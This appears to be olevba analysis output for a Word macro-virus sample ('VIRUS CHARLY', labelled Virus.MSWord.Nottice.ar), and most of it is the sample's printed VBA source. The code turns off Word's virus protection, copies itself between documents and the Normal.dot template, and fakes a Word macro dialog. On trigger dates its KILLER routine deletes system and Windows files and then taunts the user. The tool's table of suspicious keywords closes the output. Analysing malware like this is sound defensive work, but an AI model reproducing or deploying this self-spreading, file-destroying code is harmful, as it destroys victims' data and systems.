olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Nottice.ar
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Nottice.ar - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Nottice.ar - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public Ad
Public Sub MAIN() 'VIRUS CHARLY  Ver 3.1 Copyright  Lima - Perú 1998. Actualizado el 10 de Enero 1999
Attribute MAIN.VB_Description = "F%\r\n"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "Project.AutoClose.MAIN"
'Fué creado el 1 de Dic. de 1998 por CharlySoft. Está protegido por las leyes del derecho de autor;cualquier
'intento de copia sera sancionada drásticamente.
' ------------>        Je Je Je Je...
Application.DisplayAlerts = wdAlertsNone
Options.VirusProtection = False
Options.SaveNormalPrompt = False
FindKey(BuildKeyCode(wdKeyF11, wdKeyAlt)).Disable
Dim Cjt$: On Error GoTo -1: On Error GoTo SALIDA
WordBasic.DisableAutoMacros 0
Cjt$ = LCase(WordBasic.[Right$](WordBasic.[MacroFileName$](WordBasic.[MacroName$](0)), 10))
If Cjt$ = "normal.dot" Then
   If INFECTA_D = 1 Then
      GoTo SALIDA
   Else
      InfectaDOC
   End If
Else
   If INFECTA_G = 1 Then
      GoTo SALIDA
   Else
      InfectaGlobal
   End If
End If
SALIDA:
WordBasic.Call "CHARLY"
End Sub
Private Function INFECTA_D()
Dim i
INFECTA_D = 0
If WordBasic.CountMacros(1) > 0 Then
   For i = 1 To WordBasic.CountMacros(1)
     If WordBasic.[MacroName$](i, 1) = "CHARLY" Then INFECTA_D = 1
   Next i
End If
End Function
Private Function INFECTA_G()
Dim i
INFECTA_G = 0
If WordBasic.CountMacros(0) > 0 Then
   For i = 1 To WordBasic.CountMacros(0)
     If WordBasic.[MacroName$](i, 0) = "CHARLY" Then INFECTA_G = 1
   Next i
End If
End Function
Private Sub InfectaDOC()
WordBasic.FileSaveAs Format:=1
WordBasic.MacroCopy "Global:AutoClose", WordBasic.[FileName$]() + ":AutoOpen"
WordBasic.MacroCopy "Global:CHARLY", WordBasic.[FileName$]() + ":CHARLY"
WordBasic.MacroCopy "Global:HerramMacro", WordBasic.[FileName$]() + ":HerramMacro"
WordBasic.MacroCopy "Global:KILLER", WordBasic.[FileName$]() + ":KILLER"
Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="CharlyForm", Object:=wdOrganizerObjectProjectItems
WordBasic.FileSaveAll 1, 1
End Sub
Private Sub InfectaGlobal()
WordBasic.MacroCopy WordBasic.[FileName$]() + ":AutoOpen", "Global:AutoClose"
WordBasic.MacroCopy WordBasic.[FileName$]() + ":CHARLY", "Global:CHARLY"
WordBasic.MacroCopy WordBasic.[FileName$]() + ":HerramMacro", "Global:HerramMacro"
WordBasic.MacroCopy WordBasic.[FileName$]() + ":KILLER", "Global:KILLER"
Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="CharlyForm", Object:=wdOrganizerObjectProjectItems
WordBasic.FileSaveAll 1, 0
End Sub
-------------------------------------------------------------------------------
VBA MACRO CHARLY.bas 
in file: Virus.MSWord.Nottice.ar - OLE stream: 'Macros/VBA/CHARLY'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Dim Texto As String
Public Sub MAIN()
Attribute MAIN.VB_Description = "Macro creada el 01/12/98 por mi%\r\n"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "Project.CHARLYTO.MAIN"
Set Wb = WordBasic: Dia = WordBasic.Day(WordBasic.Now()): Mes = WordBasic.Month(WordBasic.Now())
If Dia = 23 And Mes = 5 Then
   Texto = "FELIZ CUMPLEAÑOS CHARLY": FORMATO
   Wb.Insert "***Lima - Perú (VIRUS CHARLY)***": EMAIL
   Wb.Call "KILLER"
INFINITO:
GoTo INFINITO
ElseIf Dia = 19 And Mes = 5 Then
   Texto = "FELICIDADES POR TU CUMPLEAÑOS MINI": FORMATO
   Wb.Insert "En Homenaje a mi Querida Hermanita.   "
   Wb.FormatFont Points:="24", Color:=2: Wb.Insert ": "
   Wb.FormatFont Points:="18", Color:=6: Wb.Insert ")"
   Wb.InsertPara: Wb.InsertPara
   Wb.Insert "***Lima - Perú (VIRUS CHARLY)***": EMAIL
   Wb.Call "KILLER"
GoTo INFINITO
End If '***FECHAS ESPECIALES***
If Dia = 4 Or Dia = 11 Or Dia = 13 Or Dia = 17 Or Dia = 31 Or (Dia = 25 And Mes = 12) Then
   If Dia = 25 And Mes = 12 Then
      Texto = "FELIZ NAVIDAD .... Je Je Je": FORMATO
      Wb.Insert "Les Desea C.J.T.A."
   End If
   Texto = " ***Lima - Perú (VIRUS CHARLY)***": FORMATO
   EMAIL
   Wb.Call "KILLER"
GoTo INFINITO
End If
End Sub
Private Sub FORMATO()
WordBasic.EditSelectAll: Selection.Delete
WordBasic.ToggleFull: WordBasic.Font "Busorama MD BT": WordBasic.FontSize 20
WordBasic.CenterPara: WordBasic.Insert Texto: WordBasic.StartOfLine: WordBasic.CharRight 1, 1
WordBasic.Bold: WordBasic.FormatFont Points:="28", Color:=2: WordBasic.EndOfLine
WordBasic.InsertPara: WordBasic.InsertPara: WordBasic.FormatFont Points:="18", Color:=6
End Sub
Private Sub EMAIL()
WordBasic.InsertPara: WordBasic.InsertPara
WordBasic.Font "Comic Sans MS": WordBasic.CenterPara: WordBasic.Bold
WordBasic.FormatFont Points:="11", Color:=2: WordBasic.Insert "Charly_Ter@Hotmail.com"
End Sub
-------------------------------------------------------------------------------
VBA MACRO HerramMacro.bas 
in file: Virus.MSWord.Nottice.ar - OLE stream: 'Macros/VBA/HerramMacro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public Sub MAIN()
CharlyForm.Show
End Sub
-------------------------------------------------------------------------------
VBA MACRO KILLER.bas 
in file: Virus.MSWord.Nottice.ar - OLE stream: 'Macros/VBA/KILLER'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public Sub MAIN() '***Elimina archivos***
Attribute MAIN.VB_Description = "Macro creada el 01/12/98 por mi%"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "Normal.KILLER.MAIN"
On Error GoTo FIN
 Kill "C:\*.*": Kill "C:\Windows\*.exe": Kill "C:\Windows\Command\*.*": Kill "C:\Windows\System\*.*"
FIN:
If ActiveDocument.Saved = False Then ActiveDocument.Save
MATADOR
End Sub
Private Sub MATADOR()
Valor = MsgBox("Maldito, Quieres Que Borre Tu Porquería de Archivos?", 4 + 16 + 4096, "VIRUS CHARLY     versión 3.1     ===>   IDAT")
If Valor = 6 Then
   Valor = MsgBox("Por Idiota Se Borraron Tus Archivos De Sistema", 0 + 64, "VIRUS CHARLY  versión 3.1  Charly_Ter@hotmail.com")
Else
   Valor = MsgBox("Mala Elección, Perdistes Tus Archivos De Sistema", 0 + 64, "VIRUS CHARLY  versión 3.1   Charly_Ter@hotmail.com")
End If
End Sub
-------------------------------------------------------------------------------
VBA MACRO CharlyForm.frm 
in file: Virus.MSWord.Nottice.ar - OLE stream: 'Macros/VBA/CharlyForm'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 




Private Sub CommandButton2_Click()
End
End Sub
Private Sub CommandButton5_Click()
M = MsgBox("El nombre del elemento del proyecto no es válido.", 48 + 0, "MicroSoft Word")
End Sub
Private Sub CommandButton7_Click()
M = MsgBox("Opción desabilitada temporalmente", 48 + 0, "Advertencia de MS Word")
End Sub
Private Sub UserForm_Activate()
CommandButton1.Enabled = False
CommandButton3.Enabled = False
CommandButton4.Enabled = False
CommandButton6.Enabled = False
ComboBox1.AddItem "Todas las plantillas y documentos activos"
ComboBox1.AddItem "Normal.dot(plantilla global)"
ComboBox1.AddItem "Comandos de Word"
ComboBox1.AddItem "Documento1 (Documento)"
ComboBox1.ListIndex = 0
ListBox2.AddItem "Macro crada el " + Str(Date)
End Sub
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Nottice.ar' - OLE stream: 'Macros/CharlyForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Nombre de la macro :�

-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Nottice.ar' - OLE stream: 'Macros/CharlyForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Macros en:a �
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Nottice.ar' - OLE stream: 'Macros/CharlyForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Descripci�n:
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Nottice.ar' - OLE stream: 'Macros/CharlyForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Ejecutar�

-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Nottice.ar' - OLE stream: 'Macros/CharlyForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahomaar
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Nottice.ar' - OLE stream: 'Macros/CharlyForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Cancelar�

-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Nottice.ar' - OLE stream: 'Macros/CharlyForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahomaar
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Nottice.ar' - OLE stream: 'Macros/CharlyForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Paso a Paso:�

-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Nottice.ar' - OLE stream: 'Macros/CharlyForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahomaar
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Nottice.ar' - OLE stream: 'Macros/CharlyForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Modificarso:�

-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Nottice.ar' - OLE stream: 'Macros/CharlyForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahomaar
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Nottice.ar' - OLE stream: 'Macros/CharlyForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Crearaar�

-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Nottice.ar' - OLE stream: 'Macros/CharlyForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahomaar
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Nottice.ar' - OLE stream: 'Macros/CharlyForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Eliminar�

-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Nottice.ar' - OLE stream: 'Macros/CharlyForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahomaar
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Nottice.ar' - OLE stream: 'Macros/CharlyForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Organizador...
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Nottice.ar' - OLE stream: 'Macros/CharlyForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahomaar
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Nottice.ar' - OLE stream: 'Macros/CharlyForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahomaar
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Nottice.ar' - OLE stream: 'Macros/CharlyForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahomaar
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Virus.MSWord.Nottice.ar' - OLE stream: 'Macros/CharlyForm'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'TextBox1'" IN 'Virus.MSWord.Nottice.ar' - OLE stream: 'Macros/CharlyForm'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label2'" IN 'Virus.MSWord.Nottice.ar' - OLE stream: 'Macros/CharlyForm'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'ComboBox1'" IN 'Virus.MSWord.Nottice.ar' - OLE stream: 'Macros/CharlyForm'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label3'" IN 'Virus.MSWord.Nottice.ar' - OLE stream: 'Macros/CharlyForm'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton1'" IN 'Virus.MSWord.Nottice.ar' - OLE stream: 'Macros/CharlyForm'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton2'" IN 'Virus.MSWord.Nottice.ar' - OLE stream: 'Macros/CharlyForm'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton3'" IN 'Virus.MSWord.Nottice.ar' - OLE stream: 'Macros/CharlyForm'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton4'" IN 'Virus.MSWord.Nottice.ar' - OLE stream: 'Macros/CharlyForm'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton5'" IN 'Virus.MSWord.Nottice.ar' - OLE stream: 'Macros/CharlyForm'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton6'" IN 'Virus.MSWord.Nottice.ar' - OLE stream: 'Macros/CharlyForm'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton7'" IN 'Virus.MSWord.Nottice.ar' - OLE stream: 'Macros/CharlyForm'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'ListBox2'" IN 'Virus.MSWord.Nottice.ar' - OLE stream: 'Macros/CharlyForm'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
-------------------------------------------------------------------------------
VBA FORM Variable "b'ListBox1'" IN 'Virus.MSWord.Nottice.ar' - OLE stream: 'Macros/CharlyForm'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |CommandButton2_Click|Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Command             |May run PowerShell commands                  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

